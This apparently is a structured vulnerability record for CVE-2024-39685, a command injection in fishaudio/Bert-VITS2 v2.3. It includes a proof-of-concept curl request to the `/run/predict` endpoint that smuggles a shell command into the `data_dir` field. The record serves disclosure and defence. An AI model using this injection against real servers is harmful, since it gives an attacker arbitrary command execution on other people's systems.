```
{
  "vulnerability": {
    "cve_id": "CVE-2024-39685",
    "description": "fishaudio/Bert-VITS2 v2.3 is vulnerable to command injections. User input supplied to the `data_dir` variable is used directly in a command executed with `subprocess.run(cmd, shell=True)` in the `resample` function, which leads to arbitrary command execution.",
    "affected_product": "fishaudio/Bert-VITS2",
    "affected_version": "v2.3",
    "root_cause": "The application uses user-controlled input (`data_dir`) directly in a command executed with `subprocess.run(cmd, shell=True)` without proper sanitization.",
    "vulnerability_details": [
      {
        "weakness": "Command Injection",
         "impact": "Arbitrary command execution on the server running Bert-VITS2.",
        "attack_vector": "By sending a crafted POST request to the `/run/predict` endpoint, an attacker can inject malicious commands via the `data_dir` parameter that will be executed by the server."
       ,
        "required_capabilities": "Attacker needs to send a crafted POST request to the server running the application.",
        "poc": "1. Run `webui_preprocess.py`. We assume here it is running on `localhost:7860`\n2. Send the following request:\n   ```\n   curl -i -s -k -X $'POST' \\\n    -H $'Host: localhost:7860' -H $'Content-Length: 108' -H $'Content-Type: application/json' -H $'Accept: */*' -H $'Origin: http://localhost:7860' \\\n    --data-binary $'{\"data\":[\"test | echo \\\"foobar\\\" > file.txt #\"],\"event_data\":null,\"fn_index\":1,\"session_hash\":\"mgkr0gp8c4o\"}' \\\n    $'http://localhost:7860/run/predict'\n   ```\n3. Observe, as visible in the payload in the previous step, that a `file.txt` has been created with the contents `foobar`."
      }
    ]
  }
}
```